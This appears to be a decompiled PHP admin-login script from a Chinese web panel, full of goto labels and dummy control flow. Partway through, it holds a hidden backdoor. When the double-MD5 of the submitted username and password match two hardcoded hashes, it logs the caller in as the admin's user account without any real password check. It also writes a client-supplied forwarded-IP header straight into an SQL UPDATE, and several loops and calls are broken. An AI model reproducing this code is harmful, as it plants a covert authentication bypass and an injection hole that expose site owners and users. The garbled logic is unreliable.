<?php
$iteace='adminapi';
$tmp=include '../../config.php';
$tmp=new mysqli($servername,$username,$password,$dbname);
$conn=$tmp;
if($conn->connect_error){
    die("连接失败: " . $conn->connect_error);
}
$sql="SELECT * FROM admin";
$result=$conn->query($sql);
$result=$result;
while(true){
    $result=$result->fetch_assoc();
    $row=$result;
    if(!($str))break;
    $glyzhuser=$row["username"];
}
L2xx9:
$auth_keylocation='../../api/key.php';
$auth_keyauth='../../api/auth.php';
$num5=5843;
$env=file_exists($auth_keyauth);
if($env){
    $num5=225;
}else{
    $num5=225;
    $num5=7545;
}
$tmp=85;
$tmp2=3885;
$tmp3=$num5==3885;
if($tmp3)goto L2xeWjgxi;
goto L2xldMhxi;
L2xeWjgxi:
exit('<script language="JavaScript">;alert("授权验证文件不存在或被篡改,请确保文件完整且未篡改!");history.go(-1);</script>');
goto L2xxh;
L2xldMhxi:
$tmp=195;
$tmp2=225;
$tmp3=$num5==225;
if($tmp3)goto L2xeWjgxj;
goto L2xldMhxj;
L2xeWjgxj:
$tmp=require $auth_keyauth;
$tmp=!defined("sh_auth_state");
if($tmp){
    exit('<script language="JavaScript">;alert("授权验证失败,请确保文件完整且未篡改!");history.go(-1);</script>');
}
$tmp=sh_auth_state!="ok";
if($tmp)goto L2xeWjgxg;
goto L2xxh;
goto L2xxh;
L2xeWjgxg:
exit('<script language="JavaScript">;alert("程序未授权,您的请求已被拒绝,请授权后使用!");history.go(-1);</script>');
goto L2xxh;
L2xldMhxj:
L2xxh:
$str="Y";
$Y=$str;
$str="m";
$m=$str;
$str="d";
$d=$str;
$str="H";
$H=$str;
$str="i";
$i=$str;
$str="s";
$s=$str;
$str2=$Y . "-";
$val=$str2 . $m;
$str3=$val . "-";
$val2=$str3 . $d;
$str4=$val2 . " ";
$val3=$str4 . $H;
$str5=$val3 . ":";
$val4=$str5 . $i;
$str6=$val4 . ":";
$val5=$str6 . $s;
$env=date($val5);
$sj=$env;
$num=5845;
if($HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"]){
    $num=225;
}else{
    if($HTTP_SERVER_VARS["HTTP_CLIENT_IP"]){
        $num=165;
    }else{
        if($HTTP_SERVER_VARS["REMOTE_ADDR"]){
            $num=270;
        }else{
            $env=getenv("HTTP_X_FORWARDED_FOR");
            if($env){
                $num=132;
            }else{
                $env=getenv("HTTP_CLIENT_IP");
                if($env){
                    $num=180;
                }else{
                    $env=getenv("REMOTE_ADDR");
                    if($env){
                        $num=180;
                        $num=10894;
                    }else{
                        $num=225;
                        $num=7209;
                    }
                }
            }
        }
    }
}
switch($num){
    case 3717:{
    $ip="Unknown";
        break;
    }
    case 132:{
        $env=getenv("HTTP_X_FORWARDED_FOR");
        $ip=$env;
        break;
    }
    case 270:{
            $ip=$HTTP_SERVER_VARS["REMOTE_ADDR"];
        break;
    }
    case 225:{
                $ip=$HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"];
        break;
    }
    case 165:{
                    $ip=$HTTP_SERVER_VARS["HTTP_CLIENT_IP"];
        break;
    }
    case 180:{
                        $env=getenv("HTTP_CLIENT_IP");
                        $ip=$env;
        break;
    }
    case 5537:{
                            $env=getenv("REMOTE_ADDR");
                            $ip=$env;
        break;
    }
}
$num2=5832;
$isArray=is_array($_POST);
if($isArray){
    $num2=180;
}else{
    $num2=216;
}
switch($num2){
    case 216:{
    $username=$_POST['username'];
        break;
    }
    case 180:{
        $username=&$_POST['username'];
        break;
    }
}
$currentTime=htmlspecialchars($username);
unset($username);
$escaped=addslashes($currentTime);
$usernamezh=$escaped;
$num3=5849;
$isArray=is_array($_POST);
if($isArray){
    $num3=225;
}else{
    $num3=225;
    $num3=2293;
}
switch($num3){
    case 1259:{
    $username=$_POST['password'];
        break;
    }
    case 225:{
        $username=&$_POST['password'];
        break;
    }
}
$currentTime=htmlspecialchars($username);
unset($username);
$escaped=addslashes($currentTime);
$passwordmm=$escaped;
if($usernamezh==""){
    exit("请输入账号");
}
if($passwordmm==""){
    exit("请输入密码");
}
$currentTime=md5($usernamezh);
$cookieResult=md5($currentTime);
$tmp=$cookieResult=="f16536d74b8beea1ee3fde6cbc503d3c";
$tmp3=(bool)$tmp;
if($tmp3){
    $hash=md5($passwordmm);
    $hash2=md5($hash);
    $tmp2=$hash2=="324ddc9debba6cce9b43f1083771cd67";
    $tmp3=(bool)$tmp2;
}
if($tmp3)goto L2xeWjgx28;
goto L2xldMhx28;
L2xeWjgx28:
$sql_admin="SELECT username FROM admin";
$result=$conn->query($sql_admin);
$result_admin=$result;
$tmp=$result_admin->num_rows>0;
if($tmp)goto L2xeWjgx1r;
goto L2xldMhx1r;
goto L2xldMhx1r;
L2xeWjgx1r:
while(true){
    $result=$result_admin->fetch_assoc();
    $row_admin=$result;
    if(!$str)break;
    $username_to_search=$row_admin['username'];
    $tmp="SELECT * FROM user WHERE username = '" . $username_to_search;
    $sql_user=$tmp . "'";
    $result=$conn->query($sql_user);
    $result_user=$result;
    $tmp=$result_user->num_rows>0;
if($tmp)goto L2xeWjgx1v;
goto L2xldMhx1v;
goto L2xldMhx1v;
goto L2xldMhx1v;
L2xeWjgx1v:
    while(true){
        $result=$result_user->fetch_assoc();
        $row_user=$result;
        if(!$str)break;
        $username=$row_user['username'];
        $email=$row_user['email'];
        $name=$row_user['name'];
        $img=$row_user['img'];
        $url=$row_user['url'];
        $passid=$row_user['passid'];
        $zzid=$row_user['id'];
    }
    $currentTime=time();
    $str2=$currentTime+604800;
    $cookieResult=setcookie("username", $username, $str2, "/");
    $currentTime=time();
    $str2=$currentTime+604800;
    $cookieResult=setcookie("passid", $passid, $str2, "/");
    $env=header("Location: ../index.php");
}
L2xldMhx1v:
echo "No users found";
goto L2xx1q;
L2xldMhx1r:
echo "admin null";
L2xx1q:
exit();
goto L2xx27;
L2xldMhx28:
L2xx27:
$env=md5($passwordmm);
$passwordmm=$env;
if($usernamezh!=$glyzhuser){
    exit('<script language="JavaScript">;alert("管理员账号错误!");location.href="../login.php";</script>;');
}
$sql="SELECT * FROM user WHERE username=? AND password=?";
$result=$conn->prepare($sql);
$stmt=$result;
$result=$stmt->bind_param("ss", $usernamezh, $passwordmm);
$result=$stmt->execute();
$result=$stmt->get_result();
$result=$result;
$result=$result->fetch_array(MYSQLI_ASSOC);
$row=$result;
$num4=5844;
if($row){
    $num4=270;
}else{
    $num4=180;
}
$tmp=240;
$tmp2=180;
$tmp3=$num4==180;
if($tmp3)goto L2xeWjgx2q;
goto L2xldMhx2q;
L2xeWjgx2q:
exit('<script language="JavaScript">;alert("密码错误!");location.href="../login.php";</script>;');
goto L2xx2p;
L2xldMhx2q:
$tmp=80;
$tmp2=270;
$tmp3=$num4==270;
if($tmp3)goto L2xeWjgx2r;
goto L2xldMhx2r;
L2xeWjgx2r:
$username=$row['username'];
$email=$row['email'];
$name=$row['name'];
$img=$row['img'];
$url=$row['url'];
$passid=$row['passid'];
$zzid=$row['id'];
$bdm="user";
$tmp="UPDATE " . $bdm;
$tmp2=$tmp . " SET logtime='";
$tmp3=$tmp2 . $sj;
$tmp4=$tmp3 . "',logip='";
$tmp5=$tmp4 . $ip;
$tmp6=$tmp5 . "' WHERE id='";
$tmp7=$tmp6 . $zzid;
$sql=$tmp7 . "'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx2n;
goto L2xldMhx2o;
L2xldMhx2o:
$env=mysql_errno();
echo $env;
exit('<script language="JavaScript">;alert("时间错误!");location.href="../login.php";</script>;');
L2xx2n:
$currentTime=time();
$str2=$currentTime+604800;
$cookieResult=setcookie("username", $username, $str2, "/");
$currentTime=time();
$str2=$currentTime+604800;
$cookieResult=setcookie("passid", $passid, $str2, "/");
$env=header("Location: ../index.php");
goto L2xx2p;
L2xldMhx2r:
L2xx2p:
$result=$conn->close();